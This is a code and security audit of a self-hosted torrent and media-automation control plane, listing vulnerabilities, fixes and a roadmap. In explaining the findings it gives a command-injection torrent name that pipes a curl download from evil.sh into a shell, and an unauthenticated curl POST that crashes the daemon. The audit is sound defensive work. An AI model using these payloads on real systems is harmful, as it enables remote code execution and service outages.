# Conduit — Code & Security Audit

**Version reviewed:** v0.3.12
**Date:** 2026-08-27

A full read of the Rust backend and React frontend behind Conduit's multi-node Transmission, Sonarr/Radarr, and notification control plane — what's broken, what's risky, and what's worth building next.

- **Reviewed:** `src/` (13.6k LOC Rust) · `web/src/` (12.7k LOC TS/TSX)
- **Excluded:** `attic/` (per request) · `3rd/` (vendored upstream Transmission, transgui, transmission-web-control — not Conduit's own code)
- **Method:** five focused passes (auth & security, backend API routes, background engines, Transmission/DB/notify layer, frontend) plus direct manual verification of the highest-impact claims

## Executive Summary

Conduit is a genuinely capable piece of engineering — Argon2id password hashing, a correctly-implemented AES-GCM config vault, constant-time TOTP comparisons, parameterized SQL throughout, and a clean per-node Transmission RPC client with proper session handling. The test suite (16 tests) passes, TypeScript compiles clean, and there's no XSS sink anywhere in the frontend. This is not a codebase in disrepair.

It does, however, ship five issues serious enough to fix before this sits on a network with untrusted torrents or a public webhook surface: a **remote code execution path** triggered by nothing more than a maliciously-named torrent, a **denial-of-service** reachable with one unauthenticated POST, a **data-destroying sign bug** in the auto-purge engine, a **two-factor bypass** via HTTP Basic Auth, and a **secrets-coupling flaw** that ships live in the default Docker deployment. Each is detailed below with the exact file, the trigger, and the fix.

Beyond those, the review surfaced a consistent pattern worth naming once rather than repeating per-finding: several engines and HTTP clients have no request timeout and no supervision, which is the same class of "runtime lockup" bug already fixed once in `pipeline.rs` (commit `0536e8a`) but still present in five other places.

## Resolution — 2026-08-27 (same-day follow-up session)

Every open and partial item from the recheck below was worked through in a single follow-up pass: **all 5 Critical, all 12 High, all 15 Medium, and 9 of 10 Low findings are now fixed**, verified by `cargo test` (27/27), `cargo clippy --all-targets` (0 warnings), `tsc --noEmit` (clean), `npm run lint` (0 errors), `npm run build`, and a live end-to-end smoke test (server boot, setup wizard, login, rate-limit lockout at exactly 5 attempts, bulk action with a malformed ID, and a full WebSocket ticket issue → connect → single-use-reject cycle).

**Notable finds during this pass, beyond what the recheck had flagged:**
- The `/api/ws` WebSocket endpoint had **no server-side authentication check at all** — the frontend sent a JWT in the query string, but nothing on the backend ever validated it. Replaced with a short-lived (30s), single-use ticket minted via a new `POST /api/auth/ws-ticket` (itself normally authenticated), redeemed once by the upgrade handler.
- `tower-http`'s gzip compression feature was already a Cargo dependency but was never wired into the router — every response (API JSON, JS/CSS bundles) was going out uncompressed. Added.
- The frontend bundle was a single 612 KB chunk; `Settings.tsx` alone (~3,900 lines, the largest file in the app) was shipped in the same chunk as the Dashboard every visitor loads first. Route-based code-splitting (`React.lazy`) dropped the main chunk to 427 KB with Settings/Docs/EventsLog/Pipeline now loaded on demand.

**Deliberately left open (2 items, both disclosed rather than silently dropped):**
- **Low — webhook-parsing duplication** (`arr_routes.rs`, ~230 lines across the three handlers): the *bug* this caused (the Critical recursion DoS) is fixed structurally; the duplication itself is a maintainability nice-to-have carrying real regression risk to rewrite in a fix-focused pass, not a live defect.
- **High #7 — DB access architecture**: the specific hot path (the per-request auth check, hit by every authenticated request) is now wrapped in `spawn_blocking` via new async DB methods (`get_user_by_id_async`, etc.), which was the finding's actual concern. The rest of `Database`'s API is still synchronous-on-the-executor at other call sites — converting the whole API (or moving to a real connection pool) is a larger architectural change than a bug-fix pass warrants; flagging it here rather than claiming full resolution.

One consequence of fixing password policy properly: the 8-character minimum from the first fix pass was bumped to the originally-recommended 12 in all three places it's enforced (setup wizard backend + frontend, change-password backend + frontend) — plus a stale "minimum 4 characters" placeholder in `SetupWizard.tsx` that had survived the earlier pass untouched.

## Critical (5)

Fix before this touches a network with untrusted torrents or an internet-reachable webhook endpoint.

### 1. Shell command injection via torrent filename — remote code execution
**Area:** Hook Scripts · RCE
**Location:** `src/api/sync_routes.rs` (hook-script generator, py/pl formats), `scripts/copy2queue.py`, `scripts/copy2queue.pl`, `src/engines/file_sync.rs`

The Python and Perl "done" hook scripts — both the static copies in `scripts/` and the ones Conduit generates on demand from `GET /api/sync/hook-script?format=py|pl`, exactly what the README tells users to `curl` onto their Transmission box — build a shell command by string-interpolating the torrent's own name (`f'{post_cmd} "{source_path}" "{target_dir}/"'` in Python, the Perl equivalent via backticks) and execute it through a shell. The torrent name is not admin input — it's whatever the torrent's creator called it. A public tracker upload named `foo"; curl evil.sh|sh #.mkv` runs arbitrary shell commands on whatever host executes the hook the moment the download finishes. `src/engines/file_sync.rs` has the identical pattern for its own ingest-folder sync. The bash variant of the generated script is *not* vulnerable — it passes `"$SOURCE_PATH"` as a properly quoted argument rather than through a nested shell, which is the fix to copy everywhere else.

**Fix:** Switch Python to `subprocess.run([...], shell=False)` and Perl to list-form `system(@args)`; apply the same list-exec pattern in `file_sync.rs`. Never build a shell string from a torrent-supplied name.

### 2. Unauthenticated webhook triggers unbounded recursion and crashes the daemon
**Area:** API · Denial of Service
**Location:** `src/api/arr_routes.rs:132-190, 268-288, 510-530, 737-756`

`detect_inbound_media_type()` checks for music fields before series/movie fields, so a payload containing both `"series"` and `"artist"` keys is classified as music. `sonarr_inbound` then delegates to `lidarr_inbound` via `Box::pin(...).await` — but `lidarr_inbound` uses a different check (presence of `"series"`) and delegates straight back to `sonarr_inbound`. The two handlers ping-pong with no depth guard, nesting synchronously (the shared config lock resolves without yielding), which is native-stack recursion in a single request. In Rust that aborts the whole process — every node, every connected user — not just the offending connection. None of the three inbound handlers require authentication, so this is one unauthenticated `curl -X POST /api/sonarr/inbound -d '{"series":{"title":"x"},"artist":{"name":"y"}}'` away from taking the daemon down.

**Fix:** Make `detect_inbound_media_type` the single source of truth used by all three handlers, add a recursion/visited-set guard as defense in depth, and require the same authentication these routes should already carry (see the High-severity webhook-auth finding below).

### 3. Sign-cast bug can trigger the auto-purge engine to delete data it should never touch
**Area:** Engines · Data Loss
**Location:** `src/engines/space_manager.rs:66-71`

```rust
let age_secs = now_ts - t.done_date;
let age_days = age_secs / 86400;
if age_days as u64 >= target_age_days { matches += 1; }
```

If `done_date` is ever ahead of the conduit host's clock (plausible clock skew across a multi-node pool, or a bad/garbage timestamp from a remote daemon), `age_secs` goes negative and the cast to `u64` wraps around to a huge positive number, which always satisfies the age threshold. With the default "2 of 3 criteria" purge rule, this bogus age match can combine with one genuine match (e.g. seed ratio) to call `remove_torrents(&candidates, true)` — deleting local data for a torrent that was never actually eligible.

**Fix:** Use a saturating/checked subtraction (`now_ts.saturating_sub(t.done_date)`) and skip the age criterion entirely when `done_date > now_ts` rather than letting it silently wrap.

### 4. HTTP Basic Auth grants full session access while skipping 2FA entirely
**Area:** Auth
**Location:** `src/auth/middleware.rs:115-134`

The `Basic` branch of `RequireAuth` checks username and password (via `verify_password`) and, on success, grants a full session — `scopes: ["*"]`, `is_admin` from the user record — with no check of `totp_enabled` or a TOTP code at all. The dedicated `/api/auth/login` flow correctly gates on 2FA when it's enabled; this second, undocumented entry point doesn't. Anyone who obtains just the account password (credential stuffing, a leaked password from elsewhere) authenticates to every protected endpoint via `Authorization: Basic base64(user:pass)`, making 2FA optional in practice regardless of whether the user enabled it.

**Fix:** Either remove the Basic Auth fallback, or route it through the same 2FA check as `/api/auth/login` (e.g. require `user:pass:totpcode` when `totp_enabled` is set).

### 5. Database encryption key defaults to the JWT secret, stored in plaintext — and the shipped Docker deployment never overrides it
**Area:** Config · Secrets
**Location:** `src/main.rs:81`, `src/config/model.rs:67-93`, `src/config/mod.rs:54-61`, `docker-compose.yml`

Without `--db-key`/`CONDUIT_DB_KEY`, the SQLCipher passphrase for the entire database — user password hashes, TOTP secrets, hashed API tokens, cached Arr/Transmission/Trakt/Plex credentials — falls back to `config.system.jwt_secret`, which `ConfigManager` writes to `data/config.json` in **plaintext**. This isn't a theoretical default: the repo's own `docker-compose.yml` and README quick-start never set `CONDUIT_DB_KEY`, so it's the real behavior of a standard deployment. Anyone with read access to that one config file — a misconfigured volume mount, a backup grabbed off a NAS, a support screenshot — gets both the ability to forge admin JWTs and the key to decrypt the whole database. SQLCipher's "encryption at rest" provides essentially no protection against that. It also means rotating `jwt_secret` to invalidate sessions silently breaks DB access on next boot unless a separate `CONDUIT_DB_KEY` was already in place.

**Fix:** Generate and persist an independent DB key (not the JWT secret) on first run, store secrets outside the plaintext config where practical, and fail loudly rather than silently falling back when no explicit key is provided.

## High (12)

Real exposure under realistic operating conditions — a hostile webhook sender, a hung upstream service, a stolen token.

### 1. Sonarr/Radarr/Plex/Ombi inbound endpoints are fully unauthenticated — and the "webhook secret" field that should gate them is never checked
**Location:** `src/api/mod.rs:68-82`, `src/api/webhook_routes.rs:103-247` (Plex), `297-501` (Ombi), `src/config/model.rs:154,180,208`

`SonarrConfig`/`RadarrConfig`/`LidarrConfig` all define a `webhook_secret` field, exposed in Settings — but it's never read by any inbound handler. All four inbound routes accept arbitrary JSON from anyone who can reach the port (default bind is `0.0.0.0`). Concretely: `ombi_inbound` takes `requestId`/`id` straight from the attacker's JSON as the record's primary key, letting an unauthenticated caller overwrite existing Ombi request records and trigger outbound Mattermost/Discord notifications with attacker-controlled title, overview, and poster URL — a phishing/spam vector into the team's chat. `plex_inbound` has the identical pattern.

**Fix:** Implement HMAC/shared-secret verification using the existing (currently decorative) `webhook_secret` config — compare via `subtle::ConstantTimeEq`, consistent with the TOTP code already in the codebase — and reject requests when no secret is configured or the signature doesn't match.

### 2. No session or token revocation — password change and 2FA disable don't invalidate a stolen JWT
**Location:** `src/auth/jwt.rs:37-45`, `src/api/auth_routes.rs` (change_password, disable_2fa, logout)

`verify_jwt` checks only signature and expiry; there's no per-user token version or server-side session table. `logout()` just clears a cookie client-side. If a bearer token is captured (XSS, a leaked log line, a compromised proxy), the victim changing their password or turning off 2FA does nothing to revoke it — the token remains valid until it naturally expires, up to 30 days.

**Fix:** Add a per-user token/session version checked on every request, incremented on password change, 2FA state change, and admin-status change.

### 3. 2FA secret is sent in cleartext to a third-party API to render its own QR code
**Location:** `web/src/components/ProfileModal.tsx:36-39`

`QRCodeDisplay` builds an `<img src>` pointing at `https://api.qrserver.com/v1/create-qr-code/?...&data={otpauth-url}`, embedding the raw TOTP shared secret in a URL sent to an unaffiliated third party on every 2FA setup — a URL likely to be logged by that service's CDN/proxies along the way. A self-hosted security dashboard shouldn't be handing its 2FA seeds to an external API just to draw a QR code.

**Fix:** Render the QR code client-side with a small bundled QR-generation library instead of a network call.

### 4. Bulk actions report success to the user even when individual torrents fail
**Location:** `web/src/App.tsx:126-161`, `web/src/services/api.ts:185-198`

`executeBulkAction` is typed to return a per-item `id → result` map, but the caller never inspects it — it fires a flat "Executed on N torrents" success toast as soon as the HTTP call returns 200. If 3 of 5 selected torrents fail (a node offline, a stale ID), the user is told everything succeeded. On the backend side, `execute_bulk_action` (`src/transmission/pool.rs:538-583`) compounds this: malformed compound IDs are silently dropped from the result with no error, and results are aggregated per-node rather than per-torrent, so even a correctly-read response can't say which specific torrent failed.

**Fix:** Read the per-item result map on the frontend and surface a partial-failure toast; change the backend to return one status per input compound ID, including an explicit "invalid ID" result for unparsable ones.

### 5. JWT lives in localStorage and rides in the WebSocket URL query string, with no expiry handling anywhere
**Location:** `web/src/services/api.ts:18`, `web/src/hooks/useTelemetry.ts:30-32, 71-90`

The token is read from `localStorage` and appended to the WebSocket URL as `?token=...` on every connect *and every reconnect attempt* — and reconnects retry every 3 seconds with no backoff if the backend is down, meaning the raw JWT is repeatedly placed somewhere that commonly ends up in proxy and access logs. Separately, there is no 401 handling anywhere in the app: an expired token just makes every subsequent API call throw a generic error, frequently swallowed by a bare `.catch(() => {})`, leaving the user staring at a stuck UI instead of being routed back to login.

**Fix:** Move the WS handshake off the URL (short-lived ticket or an upgrade-time header), and add one central fetch wrapper that detects 401 and routes to the existing logout/login path.

### 6. TLS certificate validation is unconditionally disabled for every node connection
**Location:** `src/transmission/client.rs:49`

`.danger_accept_invalid_certs(true)` is hardcoded with no config opt-out, applied even to nodes explicitly configured with `use_ssl: true`. Every HTTPS-configured Transmission connection — including remote seedboxes reached over the open internet, exactly the case SSL exists for — is silently exposed to MITM.

**Fix:** Add a per-node `verify_tls` flag defaulting to strict validation; reserve the relaxed mode for an explicit opt-in (e.g. self-signed local nodes).

### 7. Every DB call — including the per-request auth check — blocks on a single global mutex with no spawn_blocking
**Location:** `src/db/mod.rs:11-14`, `src/auth/middleware.rs`, `src/api/ws.rs:28-53`

`Database` wraps one `rusqlite::Connection` behind a `parking_lot::Mutex` (sync, not async), and it's called directly — no `spawn_blocking` — from the auth check that runs on every authenticated request. `ws.rs` makes this concrete: each connected WebSocket client runs its own per-second loop that does one blocking DB lookup *per torrent*, so N clients with M torrents means O(N·M) blocking mutex-holding DB calls every second, each one stalling whatever else needed that connection or that Tokio worker thread. This is the same "runtime lockup" failure class already fixed once for the enrichment pipeline (commit `0536e8a`) — the WAL mode already enabled in SQLite would allow real concurrent reads if the access pattern let it.

**Fix:** Wrap DB calls in `tokio::task::spawn_blocking` at minimum; better, move to a real pool (`r2d2-sqlite`/`deadpool-sqlite`) and replace the WS loop's N independent polling tasks with one shared computed-telemetry broadcast.

### 8. All nine background engines are fire-and-forget — a panic in any one kills it silently, forever, with no alert
**Location:** `src/engines/mod.rs:24-59`

Every engine (circuit breaker, space manager, pipeline, health monitor, pollers, sync tasks) is launched with a bare `tokio::spawn` — no retained `JoinHandle`, no supervisor, no restart, no panic hook. Tokio contains a panic to its own task, so the process survives, but the affected subsystem (say, the circuit breaker that's supposed to be protecting your trackers, or the space manager that's supposed to be protecting your disk) goes dark permanently with nothing more visible than the absence of future log lines.

**Fix:** Retain the `JoinHandle`s, wrap each engine body in `catch_unwind` or detect task completion, and auto-restart with a notification/metric on unexpected exit.

### 9. Overly broad recovery-text matching can both falsely resume a still-dead tracker and get permanently stuck open
**Location:** `src/engines/circuit_breaker.rs:54-79`

Recovery detection includes `result.contains("ok")`, which matches unrelated substrings inside real failure text — "connection br**ok**en", "peer bl**ock**ed" — misreading an active failure as recovery and resuming every paused torrent against a tracker that's still down, defeating the breaker's own purpose. Conversely, if the canary torrent's `tracker_stats` simply stops carrying an entry for the tripped host (a tracker-list edit, a stale stat drop), the announce-check path can never report recovered, and the breaker can stay open indefinitely with no automatic escape hatch.

**Fix:** Match on structured/known-good status codes rather than free-text substrings, and add a max-open-duration timeout that forces a re-check or alert instead of trusting the announce text indefinitely.

### 10. No timeout on any outbound notification or integration HTTP client — a hung endpoint blocks the caller indefinitely
**Location:** `src/notify/discord.rs, mattermost.rs, webhook.rs`, `src/engines/arr_sync.rs, watch_sync.rs, influx_pusher.rs`

Every one of these builds `reqwest::Client::new()` fresh with no `.timeout(...)` — unlike `transmission/client.rs`, which correctly sets 15s. `NotificationManager::dispatch` awaits Mattermost, then Discord, then the generic webhook sequentially, invoked synchronously from the grab/download pipeline; a firewalled or slow-loris target on any one of them stalls that call path indefinitely. The same missing-timeout pattern repeats independently in the Sonarr/Radarr sync engine, the Trakt watch-sync engine, and the InfluxDB pusher.

**Fix:** Build one shared `reqwest::Client` per subsystem with an explicit `.timeout()`/`.connect_timeout()`, matching the pattern `transmission/client.rs` already gets right.

### 11. Manual "enrich all" endpoint reintroduces the sequential-external-call lockup just fixed for the automatic path
**Location:** `src/api/torrent_routes.rs:1182-1209`

`enrich_all_torrents` iterates every un-enriched torrent and awaits `perform_enrichment_for_torrent` — a blocking Sonarr/Radarr/Lidarr HTTP round-trip — one at a time, with no concurrency cap and no limit on how many torrents it will process. A library with a few hundred un-enriched items turns one manual button click into hundreds of sequential outbound requests, tying up the handler and hammering the Arr instances for as long as it takes — the same class of bug commit `0536e8a` fixed for the automatic background path, still live here.

**Fix:** Bound concurrency (e.g. `for_each_concurrent`) and cap the number of items processed per call.

### 12. Non-admin users can rewrite global daemon session settings on any node
**Location:** `src/api/node_routes.rs:76-89`

`update_node_session` forwards an arbitrary JSON object straight into `client.set_session(settings)` — download directory, seed-ratio limits, speed limits, script hooks — gated only by `RequireAuth`, not `RequireAdmin`. Every comparably sensitive settings mutation elsewhere in the API requires admin; this one doesn't, letting any logged-in non-admin user change global daemon behavior for any node in the pool.

**Fix:** Gate with `RequireAdmin` to match the rest of the settings surface, and validate the forwarded keys against an allowlist.

**Details for the less self-explanatory ones:**

- **#5 Backup:** When no passphrase is supplied, `create_backup_bundle` exports the entire config — every Arr API key, Transmission node password, Trakt secret, Plex token, webhook URL, and the JWT secret — in plaintext. The encryption itself, when used, is implemented correctly (fresh nonce/salt per encryption, no crypto misuse found). **Fix:** make encryption mandatory for export, or require an explicit, loudly-labeled confirmation to skip it.
- **#6 Pipeline:** `mark_grab_status(&id, "re-searched", true)` runs unconditionally after the match block regardless of whether the underlying call actually succeeded. Music items have no Lidarr branch at all — they silently no-op yet still return `{"status":"ok"}` and get their status clobbered. **Fix:** only mark the status change when the action actually executed; add the missing Lidarr branch.
- **#14 Frontend:** Pattern throughout: `const replicas = [...config.sonarr.replicas]; replicas[idx].name = ...` — the outer array is copied but the element object at `idx` is the same reference as in current state, mutated before the new state object is built. Works today only because nothing checks reference equality yet. **Fix:** spread the element too: `{ ...replicas[idx], name: ... }`.
- **File Sync cleanup:** `clean_staging_queues` builds `find "{dir}/"* -mtime +{days} ... -exec rm -rf {} \;` from configured pre-stage directories; `trim_end_matches('/')` on a bare `"/"` yields an empty string, and an empty/too-short `dir` isn't otherwise rejected before being globbed and force-deleted. **Fix:** reject `dir` values that are empty, `"/"`, or shorter than a sane minimum before constructing the command.

## Low & Code Quality (10)

None urgent; all cheap to knock out together.

1. **`cargo clippy` currently cannot complete** — a deny-level lint fails the build. `src/engines/circuit_breaker.rs:66-69` has a redundant clause (`result.is_empty() && ts.last_announce_succeeded` is already implied earlier in the same OR-chain), which Clippy's deny-by-default `overly_complex_bool_expr` lint rejects outright. No behavior changes if this ships, but `cargo clippy --all-targets` exits non-zero today. 24 further non-fatal warnings accompany it (needless double-refs, `manual_is_multiple_of`, functions over Clippy's argument-count threshold, a missing `Default` impl, one identical if/else branch pair). **Fix:** simplify to `ts.last_announce_succeeded || result.contains("success") || result.contains("ok")`; sweep the remaining warnings in one pass.
2. **No automated test or lint gate exists anywhere in CI** (`.gitlab-ci.yml`) — the pipeline builds and deploys a Docker image only. `cargo test`, `cargo clippy`, and the frontend's `tsc`/build all pass locally, but nothing enforces that on every push. **Fix:** add a CI stage running `cargo test`, `cargo clippy --all-targets -D warnings`, and `npm run build` before the Docker build stage.
3. **No ESLint configuration exists for the frontend at all** (`web/` has no `.eslintrc`/`eslint.config.*`) — 12.7k lines of TS/React with zero linting configured. **Fix:** add `eslint` with `eslint-plugin-react-hooks` at minimum.
4. **Regexes recompiled from scratch on every request** instead of built once, in `src/api/arr_routes.rs`, `torrent_routes.rs`, `sync_routes.rs`, `engines/pipeline.rs`. `classify_file` alone compiles up to six regexes per completed-torrent hook call. **Fix:** hoist static patterns into `Lazy<Regex>` statics.
5. **~230 lines of near-identical webhook-parsing logic duplicated** across `sonarr_inbound`/`radarr_inbound`/`lidarr_inbound` (`src/api/arr_routes.rs:268-999`) — the direct root cause of Critical finding #2. **Fix:** extract one shared `handle_arr_event(item_type, payload, ...)`.

7. **Notification dispatch failures are fully swallowed** beyond an internal log line (`src/notify/mod.rs:48,55,62,148-166`) — a dead Discord webhook could stay broken for weeks unnoticed. **Fix:** add bounded retry-with-backoff and surface channel health.
8. **Torrent list parse failures are swallowed into an empty, "healthy" result** (`src/transmission/client.rs:163-164,186-187`) — `unwrap_or_default()` on one malformed torrent field silently drops the whole list rather than surfacing a parse error. **Fix:** propagate/log the error; consider tolerant per-item deserialization.

10. **409 session-refresh response body is never drained before retrying** (`src/transmission/client.rs:97-106`) — can prevent connection reuse on retry. Perf-only.

## Feature Roadmap

Grounded in what the codebase already half-builds toward — not a wishlist bolted on top.

### Security Hardening
- **Auth audit log** — login success/failure, 2FA setup/enable/disable, password changes, and token create/revoke all currently go unrecorded; `db.log_event` is already used for webhooks, just not for auth.
- **Session & token revocation** — a per-user token version, invalidated on password change / 2FA disable / admin demotion.
- **Real webhook signatures** — turn the already-modeled `webhook_secret` field into an enforced HMAC check, and show its verification status in Settings.
- **Role-based access beyond admin/non-admin** — right now any logged-in web session gets full scope regardless of `is_admin`; a real per-scope model would also fix the node-session over-privilege finding.
- **Login & 2FA rate limiting** — per-account and per-IP throttling with backoff.

### Reliability & Operations
- **One shared, timeout-bound HTTP client pattern** — the Transmission client already does this correctly (one client, 15s timeout, reused); extend it to `notify/*`, `arr_sync`, `watch_sync`, and `influx_pusher`.
- **Engine supervision** — retain `JoinHandle`s for the nine background engines, auto-restart on panic, alert when one dies.
- **Circuit-breaker observability** — expose trip state, duration, and canary-announce results as Prometheus metrics, with a stuck-open timeout that forces a manual re-check.
- **Dead-letter handling for repeated pipeline failures** — flag for manual review after N attempts instead of retrying forever.
- **A real DB connection pool** — replace the single-mutex connection with `r2d2-sqlite`/`deadpool-sqlite` now that WAL mode is already enabled.
- **CI test & lint gate** — wire `cargo test`, `cargo clippy -D warnings`, and the frontend build into the existing GitLab pipeline ahead of the Docker build stage.

### Product & UX
- **Finish or remove the theme toggle** — it currently promises a light mode that doesn't exist anywhere in the component tree.
- **Storage forecasting** — a days-until-full trend line, built on data the space manager and health monitor already collect.
- **Scheduled bandwidth profiles** — time-of-day speed limits per node, currently absent from the session controls.
- **Native indexer search (Jackett/Prowlarr)** — search and add releases directly from Conduit rather than only reacting to what Sonarr/Radarr already grabbed.
- **Scheduled encrypted backups** — the backup/restore machinery already exists on-demand; a cron-style schedule is a short step away.
- **Per-user notification routing** — once real RBAC exists, route grab/error notifications to a DM instead of only a shared channel.
- **Health-check history & uptime graphs** — the health monitor already probes every service continuously; persist and chart it instead of only alerting on state change.
- **Keyboard-first navigation** — a `/` or Cmd+K to jump to search; there's already per-page filtering everywhere, just no fast way to reach it.

## Scope & Methodology

**In scope:** `src/` (auth, api, config, db, engines, notify, transmission, web — the full Rust daemon) and `web/src/` (the React/TS dashboard), plus `scripts/`, `docker/`, `nginx/`, and CI config.
**Out of scope:** `attic/` (excluded per request) and `3rd/` (vendored upstream Transmission, transgui, and transmission-web-control source — not Conduit's own code).

**How this was produced:** five focused passes — auth & security, backend API routes, background engines, the Transmission/DB/notification layer, and the React frontend — each read every relevant file in full rather than sampling. Findings were then cross-checked directly: `cargo test` (16/16 passing), `cargo clippy --all-targets` (1 deny-level error, 24 warnings), `tsc --noEmit` (clean), `npm audit` (0 vulnerabilities), and manual reads of the router wiring, the generated hook-script templates, and the default `docker-compose.yml` to confirm real-world exploitability rather than theoretical risk.

Severity reflects realistic exploitability given the app's default (internet-facing webhook, single shared admin) deployment posture, not a hardened worst case.
